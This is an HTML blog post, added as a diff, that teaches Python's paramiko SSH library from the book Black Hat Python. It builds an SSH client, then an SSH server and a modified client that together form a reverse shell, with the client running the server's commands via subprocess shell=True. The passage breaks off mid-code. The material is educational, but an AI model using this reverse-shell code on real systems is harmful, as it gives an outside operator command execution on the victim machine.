@@ -1,0 +1,1051 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>Black Hat Python: The Paramiko Module</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="">
+    <meta name="author" content="bt3">
+
+    <!-- Le styles -->
+    <link rel="stylesheet" href="http://bt3gl.github.io/theme/css/bootstrap.dark.css" type="text/css" />
+    <style type="text/css">
+      body {
+        padding-top: 60px;
+        padding-bottom: 40px;
+      }
+      .sidebar-nav {
+        padding: 9px 0;
+      }
+      .tag-1 {
+        font-size: 13pt;
+      }
+      .tag-2 {
+        font-size: 11pt;
+      }
+      .tag-2 {
+        font-size: 10pt;
+      }
+      .tag-4 {
+        font-size: 8pt;
+     }
+    </style>
+    <link href="http://bt3gl.github.io/theme/css/bootstrap-responsive.dark.css" rel="stylesheet">
+        <link href="http://bt3gl.github.io/theme/css/font-awesome.css" rel="stylesheet">
+
+    <link href="http://bt3gl.github.io/theme/css/pygments.css" rel="stylesheet">
+
+    <!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
+    <!--[if lt IE 9]>
+      <script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <!-- Le fav and touch icons -->
+    <link rel="shortcut icon" href="http://bt3gl.github.io/theme/images/favicon.ico">
+    <link rel="apple-touch-icon" href="http://bt3gl.github.io/theme/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="http://bt3gl.github.io/theme/images/apple-touch-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="http://bt3gl.github.io/theme/images/apple-touch-icon-114x114.png">
+
+    <link href="http://bt3gl.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Higher Bytes by bt3 ATOM Feed" />
+
+  </head>
+
+  <body>
+
+    <div class="navbar navbar-fixed-top">
+      <div class="navbar-inner">
+        <div class="container-fluid">
+          <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </a>
+          <a class="brand" href="http://bt3gl.github.io/index.html">Higher Bytes by bt3 </a>
+          <div class="nav-collapse">
+            <ul class="nav">
+                          <li class="divider-vertical"></li>
+
+
+                          <ul class="nav pull-right">
+                                <li><a href="http://bt3gl.github.io/authors.html">About</a></li>
+                                <li><a href="https://github.com/bt3gl">GitHub</a></li>
+                                <li><a href="https://twitter.com/_b_t_3_">Twitter</a></li>
+                                <li><a href="https://coderwall.com/p/kubxjq?i=11&p=2&q=author%3Abt3gl&t%5B%5D=bt3gl">CodeWall</a></li>
+                                <li><a href="projects_page/index.html">Projects</a></li>
+                                <li><a href="http://bt3gl.github.io/archives.html"><b>Archives</b></a></li>
+
+                          </ul>
+
+            </ul>
+            <!--<p class="navbar-text pull-right">Logged in as <a href="#">username</a></p>-->
+          </div><!--/.nav-collapse -->
+        </div>
+      </div>
+    </div>
+
+    <div class="container-fluid">
+      <div class="row">
+        <div class="span9" id="content">
+<section id="content">
+        <article>
+                <header>
+                        <h1>
+                                <a href=""
+                                        rel="bookmark"
+                                        title="Permalink to Black Hat Python: The Paramiko Module">
+                                        Black Hat Python: The Paramiko Module
+                                </a>
+                        </h1>
+                </header>
+                <div class="entry-content">
+                <div class="well">
+<footer class="post-info">
+<abbr class="published" title="2014-12-16T06:30:00">
+      Tue 16 December 2014 </abbr>
+
+<span class="label"> Category</span>
+<a href="http://bt3gl.github.io/category/networking.html"><i class="icon-folder-open"></i>Networking</a>
+
+
+<span class="label">Tags</span>
+	<a href="http://bt3gl.github.io/tag/python.html"><i class="icon-tag"></i>Python</a>
+	<a href="http://bt3gl.github.io/tag/paramiko.html"><i class="icon-tag"></i>paramiko</a>
+	<a href="http://bt3gl.github.io/tag/ssh.html"><i class="icon-tag"></i>SSH</a>
+	<a href="http://bt3gl.github.io/tag/pycrypto.html"><i class="icon-tag"></i>PyCrypto</a>
+	<a href="http://bt3gl.github.io/tag/getopt.html"><i class="icon-tag"></i>getopt</a>
+	<a href="http://bt3gl.github.io/tag/threading.html"><i class="icon-tag"></i>threading</a>
+	<a href="http://bt3gl.github.io/tag/socket.html"><i class="icon-tag"></i>socket</a>
+	<a href="http://bt3gl.github.io/tag/book.html"><i class="icon-tag"></i>Book</a>
+</footer><!-- /.post-info -->                </div>
+                <p>This is the second post based on my readings from <a href="http://www.nostarch.com/blackhatpython">Black Hat Python</a>. Yesterday I talked about Python's <a href="http://bt3gl.github.io/black-hat-python-networking-the-socket-module.html">socket module</a> and today I'm talking about the <a href="http://www.paramiko.org/">paramiko</a> module.</p>
+<p><strong>Paramiko</strong> is awesome!!! It uses my dear <a href="https://www.dlitz.net/software/pycrypto/">PyCrypto</a> to give us access to the <a href="http://en.wikipedia.org/wiki/SSH2">SSH2 protocol</a>, and it has a flexible and easy to use API.</p>
+<p>You are going to see it with your own eyes: in this post we will see code for SSH clients and servers, reverse shells, and tunnel connections, and it will be smooth and fun (and remember that my source codes are available in my <a href="https://github.com/bt3gl/My-Gray-Hacker-Resources">github repo</a>)!</p>
+<p>Shall we start?</p>
+<hr />
+<h2>A Simple SSH Client</h2>
+<p>The first program we are going to write is a SSH client that makes a connection to some available SSH server, and then runs a single command that we send to it.</p>
+<p>But before we start, make sure you have  <strong>paramiko</strong> installed in our environment:</p>
+<div class="highlight"><pre><span class="nv">$ </span>sudo pip install paramiko
+</pre></div>
+
+
+<h3>Writing the SSH  Client Script</h3>
+<p>Now we are ready to create our script. We start with a <strong>usage</strong> function. Since <strong>paramiko</strong> supports authentication with both a password and/or an identity file (a key), our usage function shows how to send these arguments when we run the script (plus the port, username, and the command we want to run):</p>
+<div class="highlight"><pre><span class="k">def</span> <span class="nf">usage</span><span class="p">():</span>
+    <span class="k">print</span> <span class="s">&quot;Usage: ssh_client.py  &lt;IP&gt; -p &lt;PORT&gt; -u &lt;USER&gt; -c &lt;COMMAND&gt; -a &lt;PASSWORD&gt; -k &lt;KEY&gt; -c &lt;COMMAND&gt;&quot;</span>
+    <span class="k">print</span> <span class="s">&quot;  -a                  password authentication&quot;</span>
+    <span class="k">print</span> <span class="s">&quot;  -i                  identity file location&quot;</span>
+    <span class="k">print</span> <span class="s">&quot;  -c                  command to be issued&quot;</span>
+    <span class="k">print</span> <span class="s">&quot;  -p                  specify the port&quot;</span>
+    <span class="k">print</span> <span class="s">&quot;  -u                  specify the username&quot;</span>
+    <span class="k">print</span>
+    <span class="k">print</span> <span class="s">&quot;Examples:&quot;</span>
+    <span class="k">print</span> <span class="s">&quot;ssh_client.py 129.49.76.26 -u buffy -p 22 -a killvampires  -c pwd&quot;</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</pre></div>
+
+
+<p>Moving to the <strong>main</strong> function, we are going to use <strong>getopt</strong> module to parse the arguments. That's basically what the main function does: parse the arguments, sending them to the <strong>ssh_client</strong> function:</p>
+<div class="highlight"><pre><span class="kn">import</span> <span class="nn">paramiko</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">getopt</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:]):</span>
+        <span class="n">usage</span><span class="p">()</span>
+
+    <span class="n">IP</span> <span class="o">=</span> <span class="s">&#39;0.0.0.0&#39;</span>
+    <span class="n">USER</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+    <span class="n">PASSWORD</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+    <span class="n">KEY</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+    <span class="n">COMMAND</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+    <span class="n">PORT</span> <span class="o">=</span> <span class="mi">0</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">opts</span> <span class="o">=</span> <span class="n">getopt</span><span class="o">.</span><span class="n">getopt</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">:],</span><span class="s">&quot;p:u:a:i:c:&quot;</span><span class="p">,</span> \
+            <span class="p">[</span><span class="s">&quot;PORT&quot;</span><span class="p">,</span> <span class="s">&quot;USER&quot;</span><span class="p">,</span> <span class="s">&quot;PASSWORD&quot;</span><span class="p">,</span> <span class="s">&quot;KEY&quot;</span><span class="p">,</span> <span class="s">&quot;COMMAND&quot;</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="k">except</span> <span class="n">getopt</span><span class="o">.</span><span class="n">GetoptError</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
+        <span class="k">print</span> <span class="nb">str</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
+        <span class="n">usage</span><span class="p">()</span>
+
+    <span class="n">IP</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="k">print</span> <span class="s">&quot;[*] Initializing connection to &quot;</span> <span class="o">+</span> <span class="n">IP</span>
+
+    <span class="c"># Handle the options and arguments</span>
+    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">opts</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="s">&#39;-a&#39;</span><span class="p">):</span>
+            <span class="n">PASSWORD</span> <span class="o">=</span> <span class="n">t</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+        <span class="k">elif</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="s">&#39;-i&#39;</span><span class="p">):</span>
+            <span class="n">KEY</span> <span class="o">=</span> <span class="n">t</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+        <span class="k">elif</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="s">&#39;-c&#39;</span><span class="p">):</span>
+            <span class="n">COMMAND</span> <span class="o">=</span> <span class="n">t</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+        <span class="k">elif</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="s">&#39;-p&#39;</span><span class="p">):</span>
+            <span class="n">PORT</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">t</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+        <span class="k">elif</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="s">&#39;-u&#39;</span><span class="p">):</span>
+            <span class="n">USER</span> <span class="o">=</span> <span class="n">t</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">print</span> <span class="s">&quot;This option does not exist!&quot;</span>
+            <span class="n">usage</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">USER</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">&quot;[*] User set to &quot;</span> <span class="o">+</span> <span class="n">USER</span>
+    <span class="k">if</span> <span class="n">PORT</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">&quot;[*] The port to be used is </span><span class="si">%d</span><span class="s">. &quot;</span> <span class="o">%</span> <span class="n">PORT</span>
+    <span class="k">if</span> <span class="n">PASSWORD</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">&quot;[*] A password with length </span><span class="si">%d</span><span class="s"> was submitted. &quot;</span> <span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">PASSWORD</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">KEY</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">&quot;[*] The key at </span><span class="si">%s</span><span class="s"> will be used.&quot;</span> <span class="o">%</span> <span class="n">KEY</span>
+    <span class="k">if</span> <span class="n">COMMAND</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">&quot;[*] Executing the command &#39;</span><span class="si">%s</span><span class="s">&#39; in the host...&quot;</span> <span class="o">%</span> <span class="n">COMMAND</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">&quot;You need to specify the command to the host.&quot;</span>
+        <span class="n">usage</span><span class="p">()</span>
+
+    <span class="c"># start the client</span>
+    <span class="n">ssh_client</span><span class="p">(</span><span class="n">IP</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">USER</span><span class="p">,</span> <span class="n">PASSWORD</span><span class="p">,</span> <span class="n">KEY</span><span class="p">,</span> <span class="n">COMMAND</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</pre></div>
+
+
+<p>The magic happens in the <strong>ssh_client</strong> function, which performs the following steps:</p>
+<ol>
+<li>Creates a paramiko ssh client object.</li>
+<li>Checks if the key variable is not empty, and in this case,  loads it. If the key is not found, the program sets the policy to accept the SSH key for the SSH server (if we don't do this, an exception is raised saying that the server is not found in known_hosts).</li>
+<li>Makes the connection and creates a session.</li>
+<li>Checks whether this section is active and runs the command we sent.</li>
+</ol>
+<p>Let's see how this works in the code:</p>
+<div class="highlight"><pre><span class="k">def</span> <span class="nf">ssh_client</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">passwd</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>
+    <span class="n">client</span> <span class="o">=</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">SSHClient</span><span class="p">()</span>
+
+    <span class="k">if</span> <span class="n">key</span><span class="p">:</span>
+        <span class="n">client</span><span class="o">.</span><span class="n">load_host_keys</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">client</span><span class="o">.</span><span class="n">set_missing_host_key_policy</span><span class="p">(</span><span class="n">paramiko</span><span class="o">.</span><span class="n">AutoAddPolicy</span><span class="p">())</span>
+
+    <span class="n">client</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="n">port</span><span class="p">,</span> <span class="n">username</span><span class="o">=</span><span class="n">user</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">passwd</span><span class="p">)</span>
+    <span class="n">ssh_session</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">get_transport</span><span class="p">()</span><span class="o">.</span><span class="n">open_session</span><span class="p">()</span>
+
+    <span class="k">if</span> <span class="n">ssh_session</span><span class="o">.</span><span class="n">active</span><span class="p">:</span>
+        <span class="n">ssh_session</span><span class="o">.</span><span class="n">exec_command</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+        <span class="k">print</span>
+        <span class="k">print</span> <span class="n">ssh_session</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+</pre></div>
+
+
+<p>Easy, huh?</p>
+<h3>Running the Script</h3>
+<p>We are ready to run our script. If we use the example in the usage function (and supposing the account exists in that host), we will see the following:</p>
+<div class="highlight"><pre><span class="nv">$ </span>ssh_client.py 129.49.76.26 -u buffy -p 22 -a killvampires  -c <span class="nb">pwd</span>
+<span class="o">[</span>*<span class="o">]</span> Initializing connection to 129.49.76.26
+<span class="o">[</span>*<span class="o">]</span> User <span class="nb">set </span>to buffy
+<span class="o">[</span>*<span class="o">]</span> The port to be used is 22.
+<span class="o">[</span>*<span class="o">]</span> A password with length 12 was submitted.
+<span class="o">[</span>*<span class="o">]</span> Executing the <span class="nb">command</span> <span class="s1">&#39;pwd&#39;</span> in the host...
+
+/home/buffy.
+</pre></div>
+
+
+<hr />
+<h2>A SSH Server to Reverse a Client Shell</h2>
+<p>What if we also control the SSH server and we are able to send commands to our SSH client? This is exactly what we are going to do now: we are going to write a <strong>class</strong> for this server (with a little help of the <strong>socket</strong> module) and then we will be able to <strong>reverse the shell</strong>!</p>
+<p>As a note, this script is based in some of the <a href="https://github.com/paramiko/paramiko/blob/master/demo">paramiko demos</a> and we specifically use the key from their demo files (<a href="https://github.com/paramiko/paramiko/blob/master/demos/test_rsa.key">download here</a>).</p>
+<h3>The SSH Server</h3>
+<p>In our server script, we first  create a class <strong>Server</strong> that issues a new thread event, checking whether the session is valid, and performing authentication. Notice that for simplicity we are hard-coding the values for username, password and host key, which is never a good practice:</p>
+<div class="highlight"><pre><span class="n">HOST_KEY</span> <span class="o">=</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">RSAKey</span><span class="p">(</span><span class="n">filename</span><span class="o">=</span><span class="s">&#39;test_rsa.key&#39;</span><span class="p">)</span>
+<span class="n">USERNAME</span> <span class="o">=</span> <span class="s">&#39;buffy&#39;</span>
+<span class="n">PASSWORD</span> <span class="o">=</span> <span class="s">&#39;killvampires&#39;</span>
+
+<span class="k">class</span> <span class="nc">Server</span><span class="p">(</span><span class="n">paramiko</span><span class="o">.</span><span class="n">ServerInterface</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">event</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>
+    <span class="k">def</span> <span class="nf">check_channel_request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">kind</span><span class="p">,</span> <span class="n">chanid</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">kind</span> <span class="o">==</span> <span class="s">&#39;session&#39;</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">OPEN_SUCCEEDED</span>
+        <span class="k">return</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED</span>
+    <span class="k">def</span> <span class="nf">check_auth_password</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">username</span> <span class="o">==</span> <span class="n">USERNAME</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">password</span> <span class="o">==</span> <span class="n">PASSWORD</span><span class="p">):</span>
+            <span class="k">return</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">AUTH_SUCCESSFUL</span>
+        <span class="k">return</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">AUTH_FAILED</span>
+</pre></div>
+
+
+<p>Now, let's take a look at the <strong>main</strong> function, which does the following:</p>
+<ol>
+<li>Creates a socket object to bind the host and port, so it can listen for incoming connections.</li>
+<li>Once a connection is established (the client tried to connect to the server and the socket accepted the connection), it creates a <strong>paramiko</strong> <a href="http://docs.paramiko.org/en/1.15/api/transport.html">Transport</a> object for this socket. In paramiko there are two main communication methods: <em>Transport</em>, which makes and maintains the encrypted connection, and <em>Channel</em>, which is like a sock for sending/receiving data over the encrypted session (the other three are Client, Message, and Packetizer).</li>
+<li>The program instantiates a <strong>Server</strong> object and starts the paramiko session with it.</li>
+<li>Authentication is attempted. If it is successful, we get a <strong>ClientConnected</strong> message.</li>
+<li>The server starts a loop where it will keep getting  input commands from the user and issuing it in the client. This is our reversed  shell!</li>
+</ol>
+<div class="highlight"><pre><span class="kn">import</span> <span class="nn">paramiko</span>
+<span class="kn">import</span> <span class="nn">getopt</span>
+<span class="kn">import</span> <span class="nn">threading</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:]):</span>
+        <span class="k">print</span> <span class="s">&quot;Usage: ssh_server.py &lt;SERVER&gt;  &lt;PORT&gt;&quot;</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+    <span class="c"># creating a socket object</span>
+    <span class="n">server</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">ssh_port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+        <span class="n">sock</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+        <span class="n">sock</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="n">server</span><span class="p">,</span> <span class="n">ssh_port</span><span class="p">))</span>
+        <span class="n">sock</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+        <span class="k">print</span> <span class="s">&quot;[+] Listening for connection ...&quot;</span>
+        <span class="n">client</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+    <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">&quot;[-] Connection Failed: &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">print</span> <span class="s">&quot;[+] Connection Established!&quot;</span>
+
+    <span class="c"># creating a paramiko object</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">Session</span> <span class="o">=</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">Transport</span><span class="p">(</span><span class="n">client</span><span class="p">)</span>
+        <span class="n">Session</span><span class="o">.</span><span class="n">add_server_key</span><span class="p">(</span><span class="n">HOST_KEY</span><span class="p">)</span>
+        <span class="n">paramiko</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">log_to_file</span><span class="p">(</span><span class="s">&quot;filename.log&quot;</span><span class="p">)</span>
+        <span class="n">server</span> <span class="o">=</span> <span class="n">Server</span><span class="p">()</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">Session</span><span class="o">.</span><span class="n">start_server</span><span class="p">(</span><span class="n">server</span><span class="o">=</span><span class="n">server</span><span class="p">)</span>
+        <span class="k">except</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">SSHException</span><span class="p">,</span> <span class="n">x</span><span class="p">:</span>
+            <span class="k">print</span> <span class="s">&#39;[-] SSH negotiation failed.&#39;</span>
+        <span class="n">chan</span> <span class="o">=</span> <span class="n">Session</span><span class="o">.</span><span class="n">accept</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
+        <span class="k">print</span> <span class="s">&#39;[+] Authenticated!&#39;</span>
+        <span class="n">chan</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;Welcome to Buffy&#39;s SSH&quot;</span><span class="p">)</span>
+        <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">command</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">&quot;Enter command: &quot;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+                <span class="k">if</span> <span class="n">command</span> <span class="o">!=</span> <span class="s">&#39;exit&#39;</span><span class="p">:</span>
+                    <span class="n">chan</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+                    <span class="k">print</span> <span class="n">chan</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="n">chan</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;exit&#39;</span><span class="p">)</span>
+                    <span class="k">print</span> <span class="s">&#39;[*] Exiting ...&#39;</span>
+                    <span class="n">session</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;exit&#39;</span><span class="p">)</span>
+            <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
+                <span class="n">session</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+    <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">&quot;[-] Caught exception: &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">session</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="k">pass</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</pre></div>
+
+
+<h3>The SSH Client</h3>
+<p>The last piece for our reversed shell is to make the SSH client to be able to receive commands from the server.</p>
+<p>We are going to adapt the previous client script to receive these commands. All we need to do is to add a loop inside the session:</p>
+<div class="highlight"><pre><span class="kn">import</span> <span class="nn">paramiko</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">getopt</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+
+<span class="k">def</span> <span class="nf">usage</span><span class="p">():</span>
+    <span class="k">print</span> <span class="s">&quot;Usage: ssh_client.py  &lt;IP&gt; -p &lt;PORT&gt; -u &lt;USER&gt; -c &lt;COMMAND&gt; -a &lt;PASSWORD&gt;&quot;</span>
+    <span class="k">print</span> <span class="s">&quot;  -a                  password authentication&quot;</span>
+    <span class="k">print</span> <span class="s">&quot;  -p                  specify the port&quot;</span>
+    <span class="k">print</span> <span class="s">&quot;  -u                  specify the username&quot;</span>
+    <span class="k">print</span>
+    <span class="k">print</span> <span class="s">&quot;Examples:&quot;</span>
+    <span class="k">print</span> <span class="s">&quot;ssh_client.py localhost -u buffy -p 22 -a killvampires&quot;</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">ssh_client</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">passwd</span><span class="p">):</span>
+    <span class="n">client</span> <span class="o">=</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">SSHClient</span><span class="p">()</span>
+    <span class="n">client</span><span class="o">.</span><span class="n">set_missing_host_key_policy</span><span class="p">(</span><span class="n">paramiko</span><span class="o">.</span><span class="n">AutoAddPolicy</span><span class="p">())</span>
+    <span class="n">client</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="n">port</span><span class="p">,</span> <span class="n">username</span><span class="o">=</span><span class="n">user</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">passwd</span><span class="p">)</span>
+    <span class="n">ssh_session</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">get_transport</span><span class="p">()</span><span class="o">.</span><span class="n">open_session</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">ssh_session</span><span class="o">.</span><span class="n">active</span><span class="p">:</span>
+        <span class="k">print</span> <span class="n">ssh_session</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+        <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="n">command</span> <span class="o">=</span> <span class="n">ssh_session</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">cmd_output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
